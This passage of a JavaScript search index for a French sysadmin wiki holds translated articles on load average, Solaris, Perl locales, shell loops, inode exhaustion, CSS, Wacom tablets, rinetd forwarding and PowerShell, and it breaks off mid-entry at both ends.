evolve in the same way and that at times, we are even a bit above 2.\nIt is mathematically normal that the 1-minute load is more responsive than the 5-minute load and the 15-minute load (1 \u003c 5 \u003c 15).\nWhen processes are killed, the reverse phenomenon of booting occurs.\nSummary on the Definition of Load Average linkIn summary, the load average is the average number of processes using resources or wishing to do so. That’s good, we know a bit more about it, but we still don’t know how to interpret it simply.\nA Visual Representation linkNow that we know how it is calculated, we will analyze it.\nFrom a process’s point of view, a machine can be seen as a set of resources: CPU, RAM, I/O, disks and network I/O. Processes will consume these different resources to play their role. We’ll first eliminate RAM from these processes, because it is actually contained in 2 others. Either:\nLooking for a page in memory, in which case we are using the CPU resource. We are swapping, and in this case, we are using the disk I/O resource. We’ll represent this system {processes; resources} in a funnel with, in the role of water drops, processes and, in the role of the pipe, resources. Our funnel is special because it has multiple outputs. One pipe per resource, each capable of accommodating one process.\nFor CPU, this will make one for each logical processor. For disk I/O, we consider the number of devices and disks For the network, we take the number of active network cards For a machine with a 2-core CPU, 1 disk and one network card:\nHere the Load average is equal to 3.\nUndersized Machine linkIn the previous example, the load is at 3 (on average 2 processes running and waiting for CPU). But for these processes, we only have 2 resources (the 2 CPUs). There is therefore permanently a process waiting. We can therefore consider that we are in a situation of contention on the CPU resource, and that here the machine would deserve additional CPUs.\nBe careful, the situation above is not necessarily problematic. Indeed, imagine that a process with a low priority is constantly waiting or almost. It will raise the load average by 1.\nBut at the same time, if its priority is low, it’s because we wanted it that way. Is it so serious that it runs slower? After all, the processes that interest us run correctly despite everything?!\nSo, it’s not that serious. It all depends on the responsiveness we want on that famous low priority process.\nWell-Sized Machine link Here we have a load average of 1.\nIf we have on average the situation above, we will have a load of 1. One might think that given that we use 1 resource out of 4, everything is fine, but it’s not that simple.\nIf we analyze: we have no processes waiting, and the CPU resource is fully used, but the others not at all. We could say that it’s impeccable, but we shouldn’t forget that the load is an average. As a result, we don’t know if it’s the same process that used a whole CPU or if several processes each consumed a part to finally take all the resource continuously.\nIn the first case, we simply have a process that consumes an entire CPU. A faster CPU would be more appropriate. In the second case, since no process ran all the time, it means that in the end the CPU is used at half its capacity (there are 2 CPU resources and we have consumed one on average). Is this sufficient? We’ll see that… We are beginning to see that the same load average value can have 2 completely different meanings depending on the applications on the system.\nOversized Machine? link Here is a load average of 0.5\nIn this 3rd case, we use 25% of CPU and 25% of disk I/O. Here at least, there is no contention, processes don’t wait to be served. We have finally found a case of low load average necessarily implying an unloaded machine? Mmmm not sure…\nUser Response Times linkIf we now place ourselves from a user’s point of view, the load average can have a harmful side.\nContradictory Analysis linkLet’s analyze the 2 cases:\nLoad average at 1 with 1 process consuming an entire resource (1 core) Load average at 0.5 with several processes consuming CPU and I/O We would tend to say that in the 1st case we would need one more core and that in the 2nd case everything is fine.\nImagine, that we are playing a game where the number of FPS (Frame Per Seconds) is ideal at 60 and where it consumes an entire CPU. In the 1st case, we will always have the same load of 1 regardless of the CPU in question, but with totally different situations depending on the machines.\nThere is a load average/application relationship. With the second case, imagine that a single process is responsible for the load average. 0.5 per minute, it means that it only worked for 30 seconds.\nBut since it’s an average, maybe the program made the user wait almost 30s in a row. Maybe the user requested 60 web pages one after the other and each takes 0.5s to arrive.\nTo summarize, in the first case, the user is not satisfied because he does not necessarily have the desired FPS, and in the second case, it doesn’t matter, because 0.5s for each page is more than enough knowing that he will only consult one at a time.\nUser Expectations linkSome applications such as reporting tools do not need to have a fast response time. Others, on the contrary, are not usable if we don’t have good performance, and where any additional gain can be useless (like games for example). Users can have different needs depending on the time of day (like for stock market applications).\nHaving this information on user expectations is crucial. As is the ability to compare them with objective values measured on applications.\nThe ideal is to be able to define application scenarios, to have the expected response times on these and to measure the times actually observed in order to check whether or not they are within the margins.\nIn the End linkThe load average is therefore not an ultimate value, able to say at first glance whether a machine is adequately sized or not, but in the absence of having anything else, we will make do with it largely.\nReferences linkhttp://www.kernel.org\n"
            }
        );
    index.add(
            {
                id:  591 ,
                href: "\/Utiliser_la_webconsole\/",
                title: "Using the Web Console",
                description: "Guide to using Sun's web console for managing applications through a web interface",
                content: "Introduction linkThe web console is a tool that allows you to access SUN application management via a web interface. For example, it’s possible to administer ZFS pools and partitions or manage your cluster entirely through a web interface.\nThis is very convenient for the average user and even more so when you can save time by delegating recurring tasks to a third party (non-experienced) person. That’s why I find the web console very useful. To use it, simply connect to this address: https://127.0.0.1:6789\nRegistering an Application linkWhy register an application? Well, because for example, you’ve updated your Solaris and as usual, the web console goes haywire. So to re-register your applications, we can first list what’s working:\nwcadmin list -a Deployed web applications (application name, context name, status): console ROOT [running] console com_sun_web_ui [running] console console [running] console manager [running] Let’s list the existing applications:\nls /usr/share/webconsole/webapps/ $ ls /usr/share/webconsole/webapps/ com_sun_web_ui/ console/ zfs/ Here I see that I have ZFS, and that’s what I decide to reactivate. To do this, it’s simple:\nsmreg add -a /usr/share/webconsole/webapps/zfs Now I just need to reboot the web console for the change to take effect:\nsvcadm restart webconsole Now access the web console and voilà, we’ve got ZFS back. The wcadmin command now gives us this information:\nwcadmin list -a Deployed web applications (application name, context name, status): console ROOT [running] console com_sun_web_ui [running] console console [running] console manager [running] legacy zfs [running] Resources linkhttp://docs.sun.com/app/docs/doc/817-1985/gcrrb?a=view\n"
            }
        );
    index.add(
            {
                id:  592 ,
                href: "\/Probl%C3%A8mes_de_locales_avec_Perl\/",
                title: "Perl Locale Issues",
                description: "How to solve locale issues when using Perl on Debian and Ubuntu systems.",
                content: "Introduction linkPerl is great. However, error messages are not something we enjoy. If your environment variables are misconfigured or nothing is defined at the system level, you may encounter problems when launching Perl.\nProblem linkHere is what you might encounter when launching Perl:\nperl: warning: Setting locale failed. perl: warning: Please check that your locale settings: LANGUAGE = (unset), LC_ALL = (unset), LANG = \"fr_FR@euro\" are supported and installed on your system. perl: warning: Falling back to the standard locale (\"C\"). locale: Cannot set LC_CTYPE to default locale: No such file or directory locale: Cannot set LC_MESSAGES to default locale: No such file or directory locale: Cannot set LC_ALL to default locale: No such file or directory Solution linkDebian link To solve the problem, make sure that “fr_FR@euro” is included in your system locales: dpkg-reconfigure locales If it still doesn’t work, here’s what you can do: dpkg-reconfigure console-data When it asks for the default locale, set it to “none”.\nThen, for your shell, you need to set some minimum configuration: export LANGUAGE=fr_FR@euro export LC_ALL=fr_FR@euro export LANG=fr_FR@euro Ubuntu linkSolution 1 linkExecute this command:\nsudo locale-gen fr_FR@euro Solution 2 linkAdd this to the file /var/lib/locales/supported.d/local:\nfr_FR.UTF-8 @euro For the rest, follow the Debian method described above.\n"
            }
        );
    index.add(
            {
                id:  593 ,
                href: "\/Montage_d%27un_filesystem_%C3%A0_plusieurs_endroits_simultan%C3%A9es\/",
                title: "Mounting a Filesystem in Multiple Places Simultaneously",
                description: "How to mount the same filesystem in multiple locations on Linux and BSD systems.",
                content: "Introduction linkSome might say: “There’s no need for this, just use symbolic links with ln -s”. But I disagree - it’s really not the same thing. This approach allows you to have a global view of a particular directory.\nFor example, if I want to mount /var/jails in /jails, it’s possible and here’s the result once done:\nFilesystem Size Used Avail Capacity Mounted on /dev/ad4s1a 989M 129M 782M 14% / devfs 1.0K 1.0K 0B 100% /dev /dev/ad4s1d 224G 1.4G 204G 1% /usr /dev/ad4s1e 224G 4.0M 206G 0% /var /var/jails 224G 4.0M 206G 0% /jails Commands link Linux BSD mount –bind /folder1 /folder2 mount -t nullfs /folder1 /folder2 "
            }
        );
    index.add(
            {
                id:  594 ,
                href: "\/Enlever_les_limitation_utilisateurs\/",
                title: "Removing User Limitations",
                description: "Guide on how to remove JVM memory limitations for users on Solaris systems",
                content: "Introduction linkAt work, I experienced an issue with JVM memory where Xmx and Xms were set to 4.5GB, and part of the memory was going to swap until a Full GC triggered, at which point the reserved memory (RSS) that had gone to swap returned to RAM.\nThe warning messages I received were:\npages faults I searched quite a bit before finding a solution.\nRemoving User Limitations linkFirst, for the JVM, you need to add an option at launch:\n-XX+UseISM This activates the use of Intimate Shared Memory.\nHowever, users are limited under Solaris in terms of allocatable memory, so to increase the limit:\nprojadd -U qa user.qa projmod -sK \"project.max-shm-memory=(privileged,64G,deny)\" user.pmavro Then log back in as user pmavro and verify that everything worked correctly:\n$ prctl -n project.max-shm-memory -i project user.pmavro project: 100: user.pmavro NAME PRIVILEGE VALUE FLAG ACTION RECIPIENT project.max-shm-memory privileged 64,0GB - deny - system 16,0EB max deny - Once this is done, the RES memory in the top command equals the maximum right from startup, and there are no more page fault issues. :-)\n"
            }
        );
    index.add(
            {
                id:  595 ,
                href: "\/Les_diff%C3%A9rentes_boucles_du_shell_script\/",
                title: "Different Shell Script Loops",
                description: "A guide to different loop structures in shell scripting including if, for, while, until, case statements and testing conditions.",
                content: "1. if linkConditional binary structure: depending on whether a condition is true or false, we execute a block or we don’t.\nif condition ; then instruction fi If the condition is true, then instruction (which can be a block of instructions) is executed.\nif condition ; then instruction1 else instruction2 fi For the same construction but with multiple conditions:\nif [condition1] || [condition2] ; then instruction1 else instruction2 fi If the condition is true, then instruction1 is executed and the second is ignored, otherwise instruction2 is executed and the first is ignored.\nif condition1 ; then instruction1 elif condition2 then instruction2 fi elif is equivalent to else if. Thus instruction2 is only executed if condition1 and condition2 are both true at the same time.\n2. for linkRepetitive bounded structure: loop for which we know the total number of iterations before the first pass.\nfor variable in set ; do instructions done We therefore vary the variable by making it take all the values of the set successively.\n3. while linkRepetitive structure as long as the condition is true.\nwhile condition ; do instructions done Loop whose instructions are executed as long as the condition expression is true.\nExample:\nnb_cdk=3; i=0; while [ \"$i\" -lt \"$nb_cdk\" ];do echo \"salut bahan\\n\" i=$(expr $i + 1) done or\nnb_cdk=3; declare -i i; i=0 while [ \"$i\" -lt \"$nb_cdk\" ];do echo \"salut bahan\\n\" i=$i+1 done 4. until linkRepetitive structure until the condition is true (i.e. as long as it is false).\nuntil condition ; do instructions done Loop whose instructions are executed as long as the condition expression is false.\n5. case linkMultiple choice conditional structure: depending on the value of the string expression, we can execute a wide range of instructions.\ncase string in pattern_1) instruction1 ;; pattern_2) instruction2 ;; *) the rest ;; esac If the string is similar to pattern_1 (which is a path expansion string, accepts meta characters * ?, [], {} and ~) then instruction1 is executed.\nThe string can perfectly verify several different patterns simultaneously, in this case the corresponding instructions (or blocks of instructions) will all be executed.\n6. Tests linkThe conditions of the structures can be evaluated using the test command.\n6.1 String Tests link test -z string Returns true if string is empty.\ntest -n string Returns true if string is not empty.\ntest string_1 = string_2 Returns true if the two strings are equal.\ntest string_1 != string_2 Returns true if the two strings are not equal.\n6.2 Numeric Tests link test string_1 operator string_2 Returns true if strings string_1 and string_2 are in the relational order defined by the operator which can be one among those in the table below.\nOperator Meaning -eq = -ne \u003c\u003e -lt \u003c -le \u003c= -gt \u003e -ge \u003e= 6.3 File Tests link test condition file Returns true if the file meets the condition which can be one among those described in the table below.\nOperator Returns true if -p it’s a named pipe -f regular file -d directory -c special file in character mode -b special file in block mode -r read access -w write access -x execution access -s non-empty file 6.4 Other Operators linkIt is possible to combine tests by using parentheses and the boolean operators of the following table:\nOperator Meaning ! negation -a conjunction (and) -o disjunction (or) "
            }
        );
    index.add(
            {
                id:  596 ,
                href: "\/No_space_left_on_device_alors_qu%5C%27il_y_a_de_la_place\/",
                title: "No space left on device while there is space available",
                description: "How to troubleshoot 'No space left on device' errors when disk space seems available by checking inode usage.",
                content: "The problem linkSometimes the system can no longer write to a partition and reports “No Space Left On Device” even though “df -h” shows that there is enough space available.\nFor example, I can no longer write at all to my “/var” partition. Let’s check the space with df -h:\nSys. de fich. Tail. Occ. Disp. %Occ. Monté sur /dev/sda3 9,7G 2,4G 6,9G 26% / tmpfs 498M 0 498M 0% /lib/init/rw tmpfs 498M 0 498M 0% /dev/shm /dev/sda1 122M 9,9M 106M 9% /boot /dev/sda6 132G 3,6G 121G 3% /mnt/datas /dev/sda5 4,9G 4,0G 629M 87% /var The solution linkBUT WHY??? After some reflection and research… OF COURSE! The inodes!!!\nIndeed, this can be due to a lack of inodes, which can be caused by too many small files in a directory. To check if the inodes are fine, we’ll use “df -i”:\nSys. de fich. Inodes IUtil. ILib. %IUti. Monté sur /dev/sda3 1281696 85671 1196025 7% / tmpfs 127353 6 127347 1% /lib/init/rw tmpfs 127353 1 127352 1% /dev/shm /dev/sda1 32256 29 32227 1% /boot /dev/sda6 17481728 7595 17474133 1% /mnt/datas /dev/sda5 640000 640000 0 100% /var Well, look at that! 100% inodes on /var\nNow we just need to find the guilty directory and deal with it. (In my case, it was the /var/amavis/virusmail directory which was full of small compressed files.)\n"
            }
        );
    index.add(
            {
                id:  597 ,
                href: "\/Slotlimit_:_Module_d\u0027apache_pour_limiter_les_ressources_d\u0027Apache\/",
                title: "Slotlimit: Apache Module to Limit Apache Resources",
                description: "Information about the Slotlimit module for Apache, which helps limit Apache resources",
                content: "Here’s a very practical Apache module that limits your Apache resources:\nHow To Manage Apache Resources Limits With mod_slotlimit\n"
            }
        );
    index.add(
            {
                id:  598 ,
                href: "\/CSS_:_Les_feuilles_de_style\/",
                title: "CSS: Style Sheets",
                description: "A guide to CSS pseudo-classes and their usage in web development, including link states, text formatting, and page styling.",
                content: "Introduction linkWhen developing a style sheet, it is sometimes useful to apply a style to just one small element (e.g., the first line of a paragraph) or to an element with a certain behavior (e.g., a link being hovered over). Common selectors like “body”, “p”, or “h1” do not allow for such precise style application. There are in fact other types of selectors, called pseudo-formats or pseudo-classes, that allow for more refined styling.\nSyntax linkThe name of a pseudo-class is always written in the following way: first the name of the HTML tag concerned, followed by a colon, and finally the mention of the behavior or position. For example:\na:visited (to apply a particular style to visited links); a:hover (to apply a particular style to links being hovered over); p:first-letter (to apply a particular style to the first letter of the paragraph). Note that you cannot modify these names; they are predefined keywords in the CSS format. It is not possible to create your own pseudo-classes.\nPseudo-classes for Links linkThe following pseudo-classes apply, as you might guess, only to the tag. There are five of them:\n:link, allows you to apply a style to links that have not yet been visited; :visited, allows you to apply a style to links that have already been visited; :hover, allows you to apply a style to links “hovered over” by the mouse; :active, allows you to apply a style to links that are being clicked (the style is applied as long as the finger remains pressed and ceases when the button is released); :focus, allows you to apply a style to a link when it is the target of focus (for example, navigating from link to link via the [tab] key means that each link is successively the target of focus). Note that for correct interpretation of pseudo-formats, to avoid inheritance errors, you should declare them in this order: :link, :visited, :hover, :active.\nBe aware that the pseudo-classes :hover, :active and :focus are called “dynamic pseudo-classes”, as they allow modifying the style of a tag according to an event, often a user intervention. They can very well be applied to tags other than links: titles, paragraphs, etc.\nNote, however, that older browsers do not interpret all these pseudo-classes, particularly :hover, :active and :focus, which are CSS 2 implementations.\nPseudo-classes for Texts linkText pseudo-classes allow you to apply a style to a well-defined portion of text. Thus, text pseudo-classes are generally used with the paragraph tag . There are two main text pseudo-classes:\n:first-line, which allows you to apply a style to the first line of the paragraph; :first-letter, which allows you to apply a style to the first letter of the paragraph (used in the case of drop caps, see the previous tutorial). You can also choose to insert content (static text or variable content) before or after an element, using the pseudo-classes :before and :after. The content to be inserted is then specified with the content property. The static text to be inserted must be placed in quotes, as follows:\nh1:before { content: \"hello!\"; } The above rule has the effect of writing the word “hello!” just before the level 1 heading. It is also possible to insert an image; in this case, content: should be followed by the mention url(image_name.png).\nNote that these two pseudo-classes, CSS2 implementations, are not yet interpreted by Internet Explorer.\nDescendant Pseudo-class linkA “descendant” pseudo-class allows you to apply a style to the first tag contained in a parent tag pair. The syntax of this pseudo-class is as follows:\nparent_tag \u003e first_tag:first-child { property declarations } Let’s take the example below:\n#header1 \u003e p:first-child { color: red; } And consider the corresponding HTML code portion:\nMy text here\nThe text contained between the ...\ntags will indeed be written in red, as specified in the style sheet. On the other hand, if you add an image, like this:\nMy text here\nThis won’t work anymore because is no longer the first tag encountered within the div header1. Note that Internet Explorer does not yet interpret the :first-child pseudo-class.\nPage Pseudo-classes linkIt is the @page selector that allows you to define page layout parameters for printing (dimensions, margins, etc.). There are pseudo-classes that allow you to define a specific style for right, left, or the first page of a document. Thus:\n@page:first, allows you to define the style of the first page of a document; @page:left, allows you to define the style of left pages; @page:right, allows you to define the style of right pages. Resources linkhttp://www.unixgarden.com/index.php/web/les-pseudo-classes-en-css\nOffering multiple CSS based on browser\nA colorful menu\n"
            }
        );
    index.add(
            {
                id:  599 ,
                href: "\/Incron_:_ex%C3%A9cuter_des_actions_automatiques_lors_de_changements_d%27%C3%A9tats_d%27%C3%A9l%C3%A9ments\/",
                title: "Incron: Execute Automatic Actions When File States Change",
                description: "Guide on using Incron (file trigger system) to execute automatic actions when file states change in Linux systems.",
                content: "Also known as files trigger, Incron allows you to perform actions when certain files change their state:\nTriggering Commands On File Directory Changes With Incron\n"
            }
        );
    index.add(
            {
                id:  600 ,
                href: "\/Installer_Mac_OS_X_et_ubuntu_en_dual_boot\/",
                title: "Installing Mac OS X and Ubuntu in Dual Boot",
                description: "A guide on how to install Mac OS X and Ubuntu in dual boot configuration on the same hard drive.",
                content: "Introduction linkIf you want to have Ubuntu alongside your Mac OS X on the same hard drive and be able to choose which OS to launch at boot time, then this article is for you.\nSetup linkHere are the steps:\nInstall Mac OS X Install Refit and enable it: sudo /efi/refit/enable-always.sh Once completed, launch Boot Camp and decide how much space you want to allocate Reboot from the Ubuntu CD Install Ubuntu When Ubuntu reboots, go back to Mac OS X (as it’s impossible to boot Ubuntu for now) Reinstall Refit over the existing installation, then enable it again: sudo /efi/refit/enable-always.sh Now you can reboot to boot into Ubuntu :-) "
            }
        );
    index.add(
            {
                id:  601 ,
                href: "\/Wacom_:_Mise_en_place_de_la_Wacom_Bamboo\/",
                title: "Wacom: Setting up the Wacom Bamboo",
                description: "Guide for installing and configuring a Wacom Bamboo tablet on Linux",
                content: "Introduction linkWow! You just bought a Wacom Bamboo and want it to work well on your Ubuntu! No problem!\nInstallation linkInstall the necessary packages:\nsudo apt-get install xserver-xorg-input-wacom wacom-tools Configuration linkBackup your xorg configuration:\nsudo cp /etc/X11/xorg.conf /etc/X11/xorg.conf.bak Add the following to the module section:\nSection \"Module\" .... Load \"wacom\" ... EndSection Then add the following configuration:\nSection \"InputDevice\" Driver \"wacom\" Identifier \"stylus\" #Option \"Device\" \"/dev/ttyS0\" # SERIAL Tablet Option \"Device\" \"/dev/input/wacom\" # USB Tablet Option \"Type\" \"stylus\" # Stylus pen tip Option \"USB\" \"on\" # USB Tablet Option \"Mode\" \"absolute\" # Position on the tablet #Option \"ForceDevice\" \"ISDV4\" # Tablet PC ONLY #Option \"HistorySize\" \"64\" # Buffer size Option \"Tilt\" \"on\" # Tilt #Option \"TiltInvert\" \"on\" # Tilt inversion Option \"Threshold\" \"5\" # pressure sensitivity EndSection Section \"InputDevice\" Driver \"wacom\" Identifier \"eraser\" #Option \"Device\" \"/dev/ttyS0\" # SERIAL Tablet Option \"Device\" \"/dev/input/wacom\" # USB Tablet Option \"Type\" \"eraser\" # pen eraser tip Option \"USB\" \"on\" # USB Tablet Option \"Mode\" \"absolute\" # Position on the tablet #Option \"ForceDevice\" \"ISDV4\" # Tablet PC ONLY #Option \"HistorySize\" \"64\" # Buffer size Option \"Tilt\" \"on\" # Tilt #Option \"TiltInvert\" \"on\" # Tilt inversion Option \"Threshold\" \"5\" # pressure sensitivity EndSection Section \"InputDevice\" Driver \"wacom\" Identifier \"cursor\" #Option \"Device\" \"/dev/ttyS0\" # SERIAL Tablet Option \"Device\" \"/dev/input/wacom\" # USB Tablet Option \"Type\" \"cursor\" Option \"USB\" \"on\" # USB Tablet Option \"Mode\" \"absolute\" # Position on the tablet #Option \"ForceDevice\" \"ISDV4\" # Tablet PC ONLY #Option \"HistorySize\" \"64\" # Buffer size EndSection In the ServerLayout section:\nSection \"ServerLayout\" Identifier\t\"Default Layout\" Screen\t\"Default Screen\" InputDevice\t\"Generic Keyboard\" InputDevice\t\"Configured Mouse\" InputDevice \"stylus\" \"SendCoreEvents\" InputDevice \"eraser\" \"SendCoreEvents\" InputDevice \"cursor\" \"SendCoreEvents\" # for non-LCD tablets only InputDevice \"pad\" # for Intuos3/Cintiq 21UX/Graphire4 tablets and should not send core events EndSection Restart gdm and you’re done:\n/etc/init.d/gdm restart For the tablet buttons:\nxsetwacom set pad AbsWUp 4 #scroll up xsetwacom set pad AbsWDn 5 #scroll down xsetwacom set pad button3 4 # key: scroll up xsetwacom set pad button1 5 # key: scroll dn xsetwacom set pad button2 1 #FN1 key: left mouse button xsetwacom set pad button4 3 #FN2 key: right mouse button The Gimp linkAnd for Gimp? Why doesn’t it work perfectly? Well, it can work well!\nGo to File \u003e Preferences \u003e Input Devices and click on the “Configure Extended Input Devices” button. In the device list, select each of the “stylus”, “eraser” and “pad” items, and set the “Mode” option to “Screen” for each one. Click on “Save” You can now use your tablet with Gimp.\nHowever, by default the stylus and eraser are configured to use the same tool. To change this, turn your pen to use the “eraser” end and select a tool (like the eraser…). It will now be associated with that end :)\nConfiguration Example linkHere’s an example xorg.conf:\n# xorg.conf (X.Org X Window System server configuration file) # # This file was generated by dexconf, the Debian X Configuration tool, using # values from the debconf database. # # Edit this file with caution, and see the xorg.conf manual page. # (Type \"man xorg.conf\" at the shell prompt.) # # This file is automatically updated on xserver-xorg package upgrades *only* # if it has not been modified since the last upgrade of the xserver-xorg # package. # # If you have edited this file but would like it to be automatically updated # again, run the following command: # sudo dpkg-reconfigure -phigh xserver-xorg Section \"InputDevice\" Identifier\t\"Generic Keyboard\" Driver\t\"kbd\" Option\t\"XkbRules\"\t\"xorg\" Option\t\"XkbModel\"\t\"pc105\" Option\t\"XkbLayout\"\t\"fr\" Option\t\"XkbVariant\"\t\"oss\" EndSection Section \"InputDevice\" Identifier\t\"Configured Mouse\" Driver\t\"mouse\" Option\t\"CorePointer\" Option \"Device\" \"/dev/input/mice\" Option \"Protocol\" \"ImPS/2\" Option \"ZAxisMapping\" \"4 5\" Option \"Emulate3Buttons\" \"true\" EndSection Section \"InputDevice\" Driver\t\"wacom\" Identifier\t\"stylus\" Option\t\"Device\"\t\"/dev/input/wacom\" Option\t\"Type\"\t\"stylus\" #\tOption\t\"ForceDevice\"\t\"ISDV4\"\t# Tablet PC ONLY Option\t\"USB\"\t\"on\" EndSection Section \"InputDevice\" Driver\t\"wacom\" Identifier\t\"eraser\" Option\t\"Device\"\t\"/dev/input/wacom\" Option\t\"Type\"\t\"eraser\" #\tOption\t\"ForceDevice\"\t\"ISDV4\"\t# Tablet PC ONLY Option\t\"USB\"\t\"on\" EndSection Section \"InputDevice\" Driver\t\"wacom\" Identifier\t\"cursor\" Option\t\"Device\"\t\"/dev/input/wacom\" Option\t\"Type\"\t\"cursor\" #\tOption\t\"ForceDevice\"\t\"ISDV4\"\t# Tablet PC ONLY Option\t\"USB\"\t\"on\" EndSection Section \"InputDevice\" Driver\t\"wacom\" Identifier\t\"pad\" Option\t\"Device\"\t\"/dev/input/wacom\" Option\t\"Type\"\t\"pad\" Option\t\"USB\"\t\"on\" EndSection Section \"Device\" Identifier\t\"Configured Video Device\" Driver\t\"nvidia\" Option\t\"NoLogo\"\t\"True\" EndSection Section \"Monitor\" Identifier\t\"Configured Monitor\" EndSection Section \"Screen\" Identifier\t\"Default Screen\" Monitor\t\"Configured Monitor\" Device\t\"Configured Video Device\" Defaultdepth\t24 Option\t\"RenderAccel\"\t\"True\" Option \"TwinView\" Option\t\"TwinViewOrientation\" \"LeftOf\" Option \"MetaModes\" \"1280×1024 1280×1024\" EndSection Section \"ServerLayout\" Identifier\t\"Default Layout\" screen \"Default Screen\" InputDevice \"stylus\"\t\"SendCoreEvents\" InputDevice \"cursor\"\t\"SendCoreEvents\" InputDevice \"eraser\"\t\"SendCoreEvents\" InputDevice\t\"pad\" EndSection Section \"Module\" Load\t\"glx\" EndSection Resources linkhttps://www.enpleindedans.fr/index.php/2008/01/29/utiliser-la-wacom-bamboo-avec-gimp-sous-ubuntu-gutsy/\n"
            }
        );
    index.add(
            {
                id:  602 ,
                href: "\/Rinetd_:_Forwarder_simplement_et_rapidement_vers_d\u0027autres_machines\/",
                title: "Rinetd: Simply and Quickly Forward to Other Machines",
                description: "A guide on how to use Rinetd to set up TCP forwarding between machines without complex firewall rules.",
                content: "Introduction linkIn the past we’ve examined the use of firewall rules for forwarding incoming connections from one machine to another. But there is a simpler approach using the rinetd package. Read on to learn about this tool.\nThe rinetd package contains a simple tool which may be configured to listen for connections upon a machine, and silently redirect them to a new destination. In short it acts as a simple to configure TCP proxy.\nInstallation linkYou may install this package via:\napt-get update apt-get install rinetd (If you prefer you may use “aptitude update; aptitude install rinetd” - old habits die hard with me!)\nConfiguration linkOnce installed you’ll find a configuration file located at /etc/rinetd.conf. This file is used to tell the deamon which ports it should listen for connections upon, and what it should do when they arrive.\nBy default no ports are configured for forwarding, and so the file will consist entirely of comments. A default configuration file would look something like this, to give you an idea of the configuration:\n# # forwarding rules come here # # you may specify allow and deny rules after a specific forwarding rule # to apply to only that forwarding rule # # bindadress bindport connectaddress connectport # logging information logfile /var/log/rinetd.log # uncomment the following line if you want web-server style logfile format # logcommon Note: There are more details about allowed options in the manpage which you may view by running “man rinetd”.\nTo demonstrate how the forwarding is configured and used we’ll make a simple example. Assume that you have a machine with the IP address 1.2.3.4 which has been running Apache, and that you’d like to move that to the IP address 4.3.2.1.\nYou’ve already updated DNS to point visitors to the new IP address, but you want to ensure that people connecting to the old IP still continue to receive service.\nTo handle this case you should update the /etc/rinetd.conf file to read:\n# bindadress bindport connectaddress connectport 1.2.3.4 80 4.3.2.1 80 1.2.3.4 443 4.3.2.1 443 Once you restart rinetd all incoming connections on port 80 and 443 will be seamlessly redirected from the old IP to the new one - although you will need to restart rinetd after making the change to your configuration file:\n$ /etc/init.d/rinetd restart Stopping internet redirection server: rinetd. Starting internet redirection server: rinetd. rinetd is a very small, stable, and simple program, and you might find it simpler to understand than the matching generic iptables TCP proxy solution.\nThe only downside to using rinetd is that there is no support for UDP connections, and no support for redirecting FTP access - because of the complex nature of FTP.\nResources linkhttp://www.debian-administration.org/articles/601\nPort-Forwarding With rinetd\n"
            }
        );
    index.add(
            {
                id:  603 ,
                href: "\/anti-forensics-sur-systemes-de-fichiers-ext2-ext3\/",
                title: "Anti-forensics on ext2/ext3 Filesystems",
                description: "Learn about techniques to hide data within the ext2/ext3 filesystem structure, exploring methods used by hackers to conceal information",
                content: "The first thing a hacker wants to do when they’ve managed to get into a machine is to hide the data they want to leave behind. There are those who use techniques that even my grandmother knows about, and there are those who take advantage of the internal structure of the filesystem.\nThis article explains the different solutions for hiding data in an ext2/ext3 filesystem while taking into account the constraints that remain. However, we will not address the topic of deleted data and how to recover it, which is a completely different subject (that of leaving no trace :)).\nAnti-forensics on ext2/ext3 filesystems\n"
            }
        );
    index.add(
            {
                id:  604 ,
                href: "\/Canaux_cach%C3%A9s_%5C%28ou_furtifs%5C%29\/",
                title: "Hidden (or Covert) Channels",
                description: "An introduction to hidden channels in cybersecurity and their implications for information security and privacy.",
                content: "Why worry about hidden channels? As a good paranoid, one answer could be: “they are everywhere!!!” In the case of a mild paranoia crisis, the solution would be systematic use of encryption (and cryptography by extension). Nevertheless, this cannot satisfy all needs:\nHidden (or Covert) Channels\n"
            }
        );
    index.add(
            {
                id:  605 ,
                href: "\/Introduction_au_PowerShell\/",
                title: "Introduction to PowerShell",
                description: "An introduction to Microsoft PowerShell, explaining its object-oriented nature and advantages compared to traditional command-line interfaces.",
                content: "Introduction linkPresentation of PowerShell linkYou may be wondering how PowerShell will help you, especially since you’ve learned to do without it until now.\nDue to the limited commands provided by the “cmd.exe” environment (inherited from MS-DOS), most system administrators were forced to turn to “pseudo” programming languages such as Perl, KixStart, or VBScript to perform simple tasks.\nWill Microsoft succeed in reconciling administrators of its products with a command-line environment (or shell)? This is not an easy bet, considering that Windows users have a more graphical culture than command-line. However, the graphical interface quickly shows its limitations when it comes to performing many repetitive actions. Therefore, to perform these tasks, there is no alternative other than turning to scripting and thus to PowerShell…\nI can see some of you smirking behind your screen. Those people think that Unix has been doing this very well for a long time and that Microsoft hasn’t invented anything! Well, these people are only half wrong. Indeed, Microsoft could have thought of it sooner, but Microsoft didn’t just try to do as well as Unix shells, it tried to do much better. Let’s stop any controversy right away; the purpose of this article is not to compare Unix shells to PowerShell, but rather to try to understand what PowerShell really brings.\nNew Features linkPurists or “pro-Microsoft” people could make an endless list, but I will give you my perception of things, that of a confirmed system administrator.\nHere are, in my opinion, the most important advances:\nPowerShell is object-oriented PowerShell provides access to .Net objects PowerShell brings an exceptional richness of commands PowerShell offers consistency of commands and associated parameters PowerShell provides comprehensive help on commands PowerShell is easy to learn Object Orientation of PowerShell linkIn a traditional environment, executing each command returns text. Take for example the “DIR” command. It provides a textual list of files and directories in return. In PowerShell, the equivalent of this command is called “Get-Childitem”. Although its execution returns roughly the same thing to the screen as the “DIR” command, it actually returns a list of objects to the screen. These objects are most often of file or directory type, but they can also be registry keys. You will discover that most PowerShell commands are generic.\nAdditionally, when you use the | “pipe” to pass the result of one command to another command. For example: “dir | more”. In PowerShell, you pass complete objects instead of passing text.\nYou may not understand the subtlety for now, but you will discover that this is one of the great strengths of PowerShell.\nSo to continue the previous example, you might want to get only the size of a file. How to do this with “command prompt and the dir command”?\nLet’s try…\nC:\\TEMP\u003e Dir monfichier.txt Le volume dans le lecteur C n'a pas de nom. Le numéro de série du volume est 78D5-739D Répertoire de C:\\TEMP 28/11/2006 13:00 82 944 monfichier.txt 1 fichier(s) 82 944 octets 0 Rép(s) 3 140 132 864 octets libres It’s not easy now to get just the file size. You’ll have to count the number of lines and characters to cut the string and finally hope to get the size by passing this command via the pipe to another command. Tedious!\nAnd in VBScript? It’s possible but in several lines of code.\nAnd now in PowerShell?\nPS C:\\TEMP\u003e $b = Get-ChildItem monfichier.txt; $b.length Similarly, we could very easily get the file’s creation date or last access date with the following commands:\n$b = Get-ChildItem 